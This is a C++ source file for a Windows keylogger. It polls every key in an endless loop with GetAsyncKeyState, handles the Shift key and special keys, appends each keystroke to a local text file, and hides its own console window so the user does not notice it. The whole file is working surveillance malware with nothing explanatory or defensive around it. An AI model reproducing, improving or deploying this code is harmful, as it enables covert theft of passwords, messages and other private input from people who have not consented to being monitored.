#include <iostream> // gets input prints output
#include <fstream>  // write to file and read
#include <windows.h>
#include <Winuser.h>

using namespace std;

void hide();
void log();

int main()
{
	hide();
	log();
	return 0;

}
// logging user input
void log()
{
	char c;

	for(;;) // infinite loop
	{
		// Sleep(0);
		// using ASCII to collect input
		for(c = 8; c <= 222; c++)
		{
			// check for user input
			if(GetAsyncKeyState(c) == -32767)
			{
				// ios::app prevents file rewrite with every key press
				ofstream write("keylog_stream.txt", ios::app);
				// write << c;

				// check if shift is pressed
				if(!(GetAsyncKeyState(0x10) != 0) && (c > 64) && (c <92))
				{
					c += 32;
					write << c;
					write.close();
					break;
				}
				else if((c > 64) && (c < 92))
				{
					write << c;
					write.close();
					break;
				}

				else
				{
					if(GetAsyncKeyState(0x10) != 0)
					{
						switch(c)
						{
							case 49: write << "!";
							break;
							case 50: write << "@";
							break;
							case 51: write << "#";
							break;
							case 52: write << "$";
							break;
							case 53: write << "%";
							break;
							case 54: write << "^";
							break;
							case 55: write << "&";
							break;
							case 56: write << "*";
							break;
							case 57: write << "(";
							break;
							case 48: write << ")";
							break;
							case 45: write << "_";
							break;
							case 61: write << "+";
							break;
							case 47: write << "?";
							break;
							default: write << c;
						}
					}
					else
					{
						switch(c)
						{

							case 8: write << "<Backspace>";
								break;
							case 9: write << "<TAB>";
								break;
							case 27: write << "<ESC>";
								break;
							case 127: write << "<DEL>";
								break;
							case 32: write << " ";
								break;
							case 13: write << "<Enter>\n";
								break;
							default: write << c;
						}
					}


				}

			}
				/*Check for Virtual keys
				 * case VK_SPACE:
				 * write << "<Space>";
				 * VK_RETURN
				 * VK_TAB
				 * VK_BACK
				 * VK_ESCAPE
				 * VK_DELETE*/

			}
		}
	}

// function to hide console window from user
void hide()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
/*  Junk Space
 * {
								write << " ! ";
								}
							break;
						case 34: write << "doubleQuote";
							break;
						case 35: write << " # ";
							break;
						case 36: write << " $ ";
							break;
						case 37: write << " % ";
							break;
						case 38: write << " & ";
							break;
						default: write << c;

						*/

